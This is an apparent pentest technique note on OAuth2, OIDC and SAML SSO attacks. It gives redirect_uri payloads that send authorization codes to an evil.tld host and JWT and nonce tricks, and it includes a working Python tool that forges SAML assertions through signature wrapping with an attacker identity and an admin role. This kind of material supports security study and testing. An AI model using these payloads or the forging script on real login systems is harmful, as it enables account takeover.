---
title: "OAuth2, OIDC and SAML - Redirect Bypasses, Missing State and XML Signature Wrapping"
category: web
subcategory: oauth
type: technique
tags: [oauth2, oidc, saml, saml-response, xsw, xml-signature-wrapping, redirect-uri, open-redirect, pkce, state-parameter, nonce, id-token, authorization-code, relaystate, nameid, assertion, account-takeover, jwt-tool, samlraider, burp]
difficulty: medium
summary: "SSO breaks at the edges: a redirect_uri the AS matches loosely, a state nobody checks, or an SP that verifies one assertion and reads another."
when_to_use:
  - "A login flow bounces through /authorize, /oauth/callback or /saml/acs"
  - "You see response_type=code|token, client_id, redirect_uri, state, nonce"
  - "A form auto-posts SAMLResponse / RelayState to an assertion consumer service"
  - "/.well-known/openid-configuration or /saml/metadata is reachable"
  - "The app lets you link a second identity provider to an existing account"
tools: [burp, samlraider, jwt-tool, python3, oauth-recon, curl]
cves: [CVE-2017-11427, CVE-2017-11428]
related: [jwt-attacks-full, java-spring-spel-jndi, deser-java-ysoserial, deser-dotnet-viewstate]
---

## TL;DR

OAuth/OIDC bugs are almost always *binding* bugs: the code or token is delivered somewhere
it should not be (`redirect_uri`), or is accepted without being bound to the session
(`state`, `nonce`, PKCE, `aud`). SAML bugs are almost always *signature-scope* bugs: the
signature is valid over some XML, but the SP reads different XML. Both end in account
takeover, which is why they are worth more than the RCE next to them.

## Recognise it

- `/authorize?response_type=code&client_id=..&redirect_uri=..&scope=..&state=..`
- Callback endpoints: `/callback`, `/oauth2/callback`, `/signin-oidc`, `/auth/complete`.
- `/.well-known/openid-configuration` - lists `authorization_endpoint`, `token_endpoint`,
  `jwks_uri`, `registration_endpoint`, and the `*_supported` arrays (a flag in itself when
  `none` appears in `id_token_signing_alg_values_supported`).
- SAML: an auto-submitting form with `SAMLResponse` (base64, often deflated) and
  `RelayState`; `/saml/acs`, `/sso/saml`, `/Shibboleth.sso/SAML2/POST`, `/simplesaml/`.
- HTTP-Redirect binding: `?SAMLRequest=<base64(raw-deflate)>&RelayState=&SigAlg=&Signature=`.
- Account settings offering "link Google/GitHub/SAML" - the classic CSRF-to-takeover surface.

## Theory

**OAuth's trust chain.** The authorization server authenticates the user, then hands a `code`
to a URL it believes belongs to the client. Three things must hold: the `redirect_uri` must
be *exactly* a registered value; the `state` must tie the callback to the browser session
that started it; and the code must be single-use and bound to the client (and to a PKCE
verifier for public clients). Break any one and the code becomes a bearer credential for
whoever catches it.

**Redirect matching is where it fails.** Real-world matchers do prefix or substring
comparison, normalise differently from the browser, or trust a whole domain. The classic
families: registered prefix extended (`https://app/cb` vs `https://app/cb.evil.com`), path
traversal back out of the allowed directory (`/cb/../../redirect?u=`), an *open redirect* on
an allowed host used as a hop, wildcard subdomains plus a subdomain takeover, userinfo
confusion (`https://app@evil.tld/`), fragment injection (`#` so the token is re-sent by a
JS-based handler), backslash and encoding differentials (`\`, `%2f`, `%252f`, `%00`, `%09`)
where the AS and the browser disagree on host/path boundaries, and `localhost`/port
loopholes that are meant for native apps. Even a *non*-redirecting leak counts: if the code
ends up in a URL that loads a third-party script, the `Referer` carries it.

**Why `state` matters.** Without it, an attacker completes their own authorization, captures
the callback URL, and gets a victim to visit it. On a "link account" endpoint that silently
attaches the attacker's identity to the victim's account - permanent takeover.

**PKCE and OIDC.** PKCE binds the code to a `code_verifier`; an AS that accepts a missing
`code_challenge`, or `code_challenge_method=plain`, is downgradeable. OIDC adds an
`id_token` - a JWT - so every JWT bug applies (see `jwt-attacks-full`): `alg: none`, key
confusion, `jku`/`jwks_uri` pointing at your keys, and an unchecked `nonce` that allows a
recorded `id_token` to be replayed. `aud` and `iss` must be pinned, or an `id_token` minted
for one client works on another.

**SAML message shape.** `<samlp:Response>` wraps `<saml:Assertion>`, which holds `<Subject>`
(with `<NameID>` and `<SubjectConfirmationData Recipient= NotOnOrAfter=>`), `<Conditions>`
(`NotBefore`, `NotOnOrAfter`, `<AudienceRestriction>`) and `<AttributeStatement>`. A
`<ds:Signature>` may sit on the Response, on the Assertion, or on both; its
`<ds:Reference URI="#id">` names exactly what is protected. Verification and business logic
are usually done by *different* code paths - the signature library walks to the signed
element, the application calls `getElementsByTagName("Assertion")[0]`. XML Signature
Wrapping is the art of making those two disagree.

**XSW variants.** The standard taxonomy (Somorovsky et al.):

| variant | applies to | shape |
|---|---|---|
| XSW1 | Response signature | copy the whole Response, give the copy a new ID, make the original (signed) Response a child of the copy |
| XSW2 | Response signature | same, but the signed copy is a *sibling* placed before the forged Response, detached signature |
| XSW3 | Assertion signature | forged Assertion becomes a sibling preceding the signed Assertion, both children of Response |
| XSW4 | Assertion signature | as XSW3, but the signed Assertion is nested inside the forged one |
| XSW5 | Assertion signature | signed Assertion moved out to the end of the Response; forged copy keeps the original ID |
| XSW6 | Assertion signature | signed Assertion hidden inside the forged Assertion's own Signature element |
| XSW7 | Assertion signature | signed Assertion wrapped in an `<Extensions>` element added to the Response |
| XSW8 | Assertion signature | signed Assertion placed inside `<Object>` within the forged Assertion's Signature |

The constant: the signed bytes are untouched (so verification passes), while the element the
application consumes is yours.

**Text-node truncation (CVE-2017-11427 class).** XML canonicalisation drops comments, so
`admin<!---->@corp.tld` is *signed* as `admin@corp.tld`, but a DOM reader that takes only the
first text node returns `admin`. Several independent SAML libraries shipped this in 2018.

## Attack

**1. Recon.** Pull `/.well-known/openid-configuration` and the SAML metadata
(`/saml/metadata`, `/sso/metadata`, `FederationMetadata/2007-06/FederationMetadata.xml`).
Note the supported algorithms, whether `registration_endpoint` is open, the ACS URL, and the
certificate. Decode a real `SAMLResponse` (base64 + raw deflate) before touching anything.

**2. redirect_uri matrix.** For each candidate, watch whether the AS 302s to it *with* a code:

```
https://app.tld/cb.evil.tld        https://app.tld/cb/../../open-redirect?to=//evil.tld
https://app.tld/cb@evil.tld        https://app.tld@evil.tld/cb
https://app.tld/cb#@evil.tld       https://evil.tld%23@app.tld/cb
https://app.tld/cb%2f..%2f         https://app.tld/cb%252e%252e%252f
https://app.tld/cb\@evil.tld       https://app.tld/cb/.evil.tld
http://localhost:1337/cb           https://sub.app.tld/cb   (takeover-able subdomain)
```
Also try adding a second `redirect_uri` parameter (parameter pollution), and dropping it
entirely - some servers fall back to the first registered URI, others to the `Referer`.

**3. Session-binding tests.** Remove `state` and replay the callback in another session.
Remove `code_challenge` / set `code_challenge_method=plain`. Replay a used `code`. Send a
code issued for client A to client B's token endpoint (authorization-code injection). Add
scopes the consent screen never showed. Flip `response_mode=form_post` or
`response_type=code token` to move the secret into a place the client handles differently.

**4. OIDC token tests.** Omit `nonce` and replay a captured `id_token`; swap `alg` to `none`;
point `jku`/`jwks_uri` at a host you control (dynamic client registration often lets you set
`jwks_uri`, `logo_uri`, `request_uri` - all three are SSRF primitives too); change `aud` to
another client; check whether the RP validates `iss` at all.

**5. SAML: signature scope.** In order of cheapness - strip every `<ds:Signature>` and see if
the SP still logs you in; change the `NameID` and leave the signature untouched (some SPs
verify nothing); then run XSW1-XSW8 with Burp's SAML Raider, changing only the *forged*
copy's `NameID`/attributes. The script below implements the XSW2/XSW3 sibling transform.

**6. SAML: everything else.** `NotOnOrAfter` and `Recipient` unenforced means an old
assertion still works (replay); a missing `AudienceRestriction` check means an assertion for
another SP works here; comment truncation (`admin<!---->@corp.tld`) targets the NameID
parser; `RelayState` is an open redirect in most implementations; and the whole document is
an XXE surface - many SPs parse `SAMLResponse` with external entities enabled, and the
HTTP-Redirect binding lets you deflate a bomb into a few hundred bytes.

## Code

```python
#!/usr/bin/env python3
"""SAMLResponse decoder + XML Signature Wrapping (XSW2) transformer. Stdlib only.

  python3 samlxsw.py resp.b64 attacker@evil.tld      # transform a captured token
  python3 samlxsw.py                                 # no args: self-test

HTTP-Redirect binding: base64(raw-deflate(xml))  -> zlib.decompressobj(-15)
HTTP-POST binding:     base64(xml)               -> no compression
"""
from __future__ import annotations

import base64
import sys
import zlib
from xml.dom import minidom

SAML = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol"
DSIG = "http://www.w3.org/2000/09/xmldsig#"


# --------------------------------------------------------------------------
# transport
# --------------------------------------------------------------------------
def saml_decode(blob: str) -> str:
    """base64 (+ optional raw deflate) -> XML text."""
    raw = base64.b64decode(blob.strip() + "=" * (-len(blob.strip()) % 4))
    if raw.lstrip()[:1] == b"<":
        return raw.decode("utf-8", "replace")
    return zlib.decompressobj(-15).decompress(raw).decode("utf-8", "replace")


def saml_encode(xml: str, deflate: bool = True) -> str:
    data = xml.encode()
    if deflate:
        c = zlib.compressobj(9, zlib.DEFLATED, -15)
        data = c.compress(data) + c.flush()
    return base64.b64encode(data).decode()


# --------------------------------------------------------------------------
# inspection
# --------------------------------------------------------------------------
def _text(node) -> str:
    return "".join(c.data for c in node.childNodes if c.nodeType == c.TEXT_NODE)


def describe(xml: str) -> str:
    doc = minidom.parseString(xml)
    out: list[str] = []
    for r in doc.getElementsByTagNameNS(SAMLP, "Response"):
        out.append("Response ID=%s Destination=%s InResponseTo=%s"
                   % (r.getAttribute("ID") or "-",
                      r.getAttribute("Destination") or "-",
                      r.getAttribute("InResponseTo") or "-"))
        sigs = [s for s in r.childNodes
                if s.nodeType == s.ELEMENT_NODE and s.localName == "Signature"]
        out.append("  signature on Response: %s" % ("yes" if sigs else "no"))
    for a in doc.getElementsByTagNameNS(SAML, "Assertion"):
        signed = any(c.nodeType == c.ELEMENT_NODE and c.localName == "Signature"
                     for c in a.childNodes)
        out.append("Assertion ID=%s IssueInstant=%s signed=%s"
                   % (a.getAttribute("ID") or "-",
                      a.getAttribute("IssueInstant") or "-", signed))
        for n in a.getElementsByTagNameNS(SAML, "NameID"):
            out.append("  NameID: %s" % _text(n))
        for c in a.getElementsByTagNameNS(SAML, "Conditions"):
            out.append("  Conditions NotBefore=%s NotOnOrAfter=%s"
                       % (c.getAttribute("NotBefore") or "-",
                          c.getAttribute("NotOnOrAfter") or "-"))
        for d in a.getElementsByTagNameNS(SAML, "SubjectConfirmationData"):
            out.append("  Recipient=%s NotOnOrAfter=%s"
                       % (d.getAttribute("Recipient") or "-",
                          d.getAttribute("NotOnOrAfter") or "-"))
        for at in a.getElementsByTagNameNS(SAML, "Attribute"):
            vals = [_text(v) for v in at.getElementsByTagNameNS(SAML, "AttributeValue")]
            out.append("  Attribute %s = %r" % (at.getAttribute("Name"), vals))
    for ref in doc.getElementsByTagNameNS(DSIG, "Reference"):
        out.append("ds:Reference URI=%s" % (ref.getAttribute("URI") or "-"))
    return "\n".join(out)


def _signed_assertion(doc):
    for a in doc.getElementsByTagNameNS(SAML, "Assertion"):
        if any(c.nodeType == c.ELEMENT_NODE and c.localName == "Signature"
               for c in a.childNodes):
            return a
    raise ValueError("no signed Assertion found")


def _set_nameid(assertion, value: str) -> None:
    for n in assertion.getElementsByTagNameNS(SAML, "NameID"):
        while n.firstChild:
            n.removeChild(n.firstChild)
        n.appendChild(n.ownerDocument.createTextNode(value))


def strip_signature(xml: str) -> str:
    """XSW0: just delete every ds:Signature and see whether the SP notices."""
    doc = minidom.parseString(xml)
    for s in list(doc.getElementsByTagNameNS(DSIG, "Signature")):
        s.parentNode.removeChild(s)
    return doc.toxml()


def xsw2(xml: str, attacker_nameid: str, evil_id: str = "_evil_assertion") -> str:
    """XSW2: attacker assertion as a preceding sibling of the signed one.

    The signed assertion (with its ds:Signature and original ID) is kept intact
    so signature verification still succeeds; the evil clone gets a fresh ID and
    the attacker's NameID. SPs that verify the first/last match but then read
    the *other* assertion get owned.
    """
    doc = minidom.parseString(xml)
    signed = _signed_assertion(doc)
    evil = signed.cloneNode(True)
    evil.setAttribute("ID", evil_id)
    for s in [c for c in list(evil.childNodes)
              if c.nodeType == c.ELEMENT_NODE and c.localName == "Signature"]:
        evil.removeChild(s)
    _set_nameid(evil, attacker_nameid)
    for at in evil.getElementsByTagNameNS(SAML, "Attribute"):
        if at.getAttribute("Name").lower().endswith(("role", "roles", "groups")):
            for v in at.getElementsByTagNameNS(SAML, "AttributeValue"):
                while v.firstChild:
                    v.removeChild(v.firstChild)
                v.appendChild(doc.createTextNode("admin"))
    signed.parentNode.insertBefore(evil, signed)
    return doc.toxml()


def sample_response(user: str = "alice@corp.tld",
                    assertion_id: str = "_signed_assertion") -> str:
    return (
        '<samlp:Response xmlns:samlp="%s" xmlns:saml="%s" ID="_resp1" '
        'Destination="https://sp.ctf/acs" Version="2.0">'
        '<saml:Issuer>https://idp.ctf/metadata</saml:Issuer>'
        '<saml:Assertion ID="%s" IssueInstant="2026-01-01T00:00:00Z" Version="2.0">'
        '<saml:Issuer>https://idp.ctf/metadata</saml:Issuer>'
        '<ds:Signature xmlns:ds="%s"><ds:SignedInfo>'
        '<ds:Reference URI="#%s"><ds:DigestValue>Zm9v</ds:DigestValue></ds:Reference>'
        '</ds:SignedInfo><ds:SignatureValue>YmFy</ds:SignatureValue></ds:Signature>'
        '<saml:Subject><saml:NameID>%s</saml:NameID>'
        '<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
        '<saml:SubjectConfirmationData Recipient="https://sp.ctf/acs" '
        'NotOnOrAfter="2026-01-01T00:05:00Z"/></saml:SubjectConfirmation>'
        '</saml:Subject>'
        '<saml:Conditions NotBefore="2026-01-01T00:00:00Z" '
        'NotOnOrAfter="2026-01-01T00:05:00Z"/>'
        '<saml:AttributeStatement><saml:Attribute Name="role">'
        '<saml:AttributeValue>user</saml:AttributeValue>'
        '</saml:Attribute></saml:AttributeStatement>'
        '</saml:Assertion></samlp:Response>'
        % (SAMLP, SAML, assertion_id, DSIG, assertion_id, user))


def _self_test() -> None:
    xml = sample_response()
    # transport round-trip, both bindings
    for deflate in (True, False):
        blob = saml_encode(xml, deflate)
        assert saml_decode(blob) == xml, deflate

    info = describe(xml)
    assert "_signed_assertion" in info and "alice@corp.tld" in info, info
    assert "signed=True" in info and "ds:Reference URI=#_signed_assertion" in info

    out = xsw2(xml, "admin@corp.tld")
    # both assertions survive, signature untouched, attacker identity injected
    assert out.count("<saml:Assertion") == 2, out
    assert 'ID="_signed_assertion"' in out and 'ID="_evil_assertion"' in out
    assert "admin@corp.tld" in out and "alice@corp.tld" in out
    assert "<ds:Signature " in out and out.count("<ds:SignatureValue>") == 1
    assert out.index("_evil_assertion") < out.index("<ds:Signature "), \
        "evil assertion must precede the signed one"
    assert "<saml:AttributeValue>admin</saml:AttributeValue>" in out

    info2 = describe(out)
    assert info2.count("Assertion ID=") == 2 and "signed=False" in info2, info2
    assert saml_decode(saml_encode(out)) == out

    stripped = strip_signature(xml)
    assert "ds:Signature" not in stripped and "alice@corp.tld" in stripped

    # and the payload is still a valid transport blob
    blob = saml_encode(out)
    assert saml_decode(blob).count("<saml:Assertion") == 2
    print("[ok] saml xsw self-test passed")


def main(argv: list[str]) -> int:
    blob = open(argv[1]).read() if len(argv) > 1 else ""
    attacker = argv[2] if len(argv) > 2 else "admin@corp.tld"
    xml = saml_decode(blob)
    print("--- original ---")
    print(describe(xml))
    out = xsw2(xml, attacker)
    print("--- after XSW2 ---")
    print(describe(out))
    print("--- SAMLResponse (POST binding, no deflate) ---")
    print(saml_encode(out, deflate=False))
    return 0


if __name__ == "__main__":
    if len(sys.argv) == 1:
        _self_test()
    else:
        raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **The code is single-use, your testing is not.** Capture a fresh flow for each attempt;
  "invalid_grant" usually means you replayed, not that the bug is absent.
- **Fragments never reach the server.** Leaks via `#` need a JS callback handler or a
  redirect that converts fragment to query.
- **`Referer` leakage** is silent: check whether the callback page loads third-party JS while
  the code is still in the URL bar.
- **Open redirect on the client** is enough; you do not need one on the AS.
- **SAML signature present != signature checked.** Always test the "strip it" case first; it
  costs one request and still works on hand-rolled SPs.
- **Re-signing changes the bytes.** For XSW you must keep the signed subtree byte-identical -
  reserialising with a different XML library can break it. Edit the raw string when in doubt.
- **ID collisions**: give the forged assertion a genuinely new `ID`; duplicate IDs make some
  parsers reject the whole document.
- **Deflate, not zlib.** HTTP-Redirect uses raw deflate (`zlib.decompressobj(-15)`); the
  POST binding is plain base64. Mixing them up looks like a corrupt token.
- **IdP-initiated SSO** skips `InResponseTo` entirely, which removes the last binding between
  a request and a response - if the SP supports it, unsolicited assertions are accepted.
- **Account linking by email** is the quiet killer: an IdP that lets you set an unverified
  `email` claim to a victim's address takes over their account at first login.

## Tools

- Burp: `SAML Raider` (XSW1-XSW8 in one click, certificate swapping), `JWT Editor`,
  `OAuth Scan`, Collaborator for callback capture.
- `jwt_tool` for `id_token` algorithm/claim attacks; `samltool`-style offline decoders.
- `python3 -c 'import zlib,base64,sys;print(zlib.decompress(base64.b64decode(sys.argv[1]),-15).decode())'`
  for a quick SAMLRequest decode.
- The script below for parsing, inspecting and wrapping a SAMLResponse offline.

## References

- PortSwigger Web Security Academy - OAuth 2.0 authentication vulnerabilities, SAML labs.
- Somorovsky et al. - "On Breaking SAML: Be Whoever You Want to Be" (USENIX Security 2012).
- Duo Labs - "Duo Finds SAML Vulnerabilities Affecting Multiple Implementations" (2018).
- RFC 6749 / RFC 6819 (OAuth 2.0 threat model), RFC 7636 (PKCE), OpenID Connect Core 1.0.
- OASIS SAML 2.0 Core and Web Browser SSO Profile specifications.
